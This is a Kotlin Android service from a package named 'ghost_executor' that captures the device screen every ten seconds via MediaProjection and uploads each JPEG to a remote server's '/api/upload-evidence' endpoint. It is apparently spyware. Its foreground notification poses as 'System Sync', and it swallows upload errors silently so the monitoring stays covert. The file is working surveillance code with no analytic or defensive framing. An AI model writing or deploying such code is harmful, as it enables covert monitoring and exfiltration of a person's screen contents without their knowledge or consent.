package com.example.ghost_executor

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("RESULT_CODE", Activity.RESULT_OK) ?: Activity.RESULT_OK
        val data = intent?.getParcelableExtra<Intent>("DATA")
        
        if (data != null) {
            startForeground()
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mgr.getMediaProjection(resultCode, data)
            startCapture()
        }
        return START_STICKY
    }

    private fun startForeground() {
        val channelId = "screen_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "Screen Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        startForeground(2, NotificationCompat.Builder(this, channelId).setContentTitle("System Sync").setSmallIcon(android.R.drawable.ic_menu_report_image).build())
    }

    private fun startCapture() {
        val width = resources.displayMetrics.widthPixels
        val height = resources.displayMetrics.heightPixels
        val density = resources.displayMetrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        
        virtualDisplay = mediaProjection?.createVirtualDisplay("ScreenCapture", width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader?.surface, null, null)

        val runnable = object : Runnable {
            override fun run() {
                processImage()
                handler.postDelayed(this, 10000) // Capture setiap 10 detik
            }
        }
        handler.post(runnable)
    }

    private fun processImage() {
        val image = imageReader?.acquireLatestImage() ?: return
        val planes = image.planes; val buffer = planes[0].buffer; val pixelStride = planes[0].pixelStride; val rowStride = planes[0].rowStride; val rowPadding = rowStride - pixelStride * image.width
        val bitmap = Bitmap.createBitmap(image.width + rowPadding / pixelStride, image.height, Bitmap.Config.ARGB_8888)
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()

        val bos = ByteArrayOutputStream(); bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
        uploadImage(bos.toByteArray())
    }

    private fun uploadImage(bytes: ByteArray) {
        Thread {
            try {
                val prefs = getSharedPreferences("GhostPrefs", Context.MODE_PRIVATE)
                val server = prefs.getString("server_url", "") ?: ""
                val deviceId = prefs.getString("device_id", "") ?: ""
                
                val boundary = "Boundary---"
                val url = URL("$server/api/upload-evidence")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                conn.doOutput = true

                val output = conn.outputStream
                output.write("--$boundary\r\n".toByteArray())
                output.write("Content-Disposition: form-data; name=\"image\"; filename=\"screen.jpg\"\r\n".toByteArray())
                output.write("Content-Type: image/jpeg\r\n\r\n".toByteArray())
                output.write(bytes)
                output.write("\r\n--$boundary--\r\n".toByteArray())
                output.flush()
                conn.inputStream.close()
            } catch (e: Exception) {}
        }.start()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}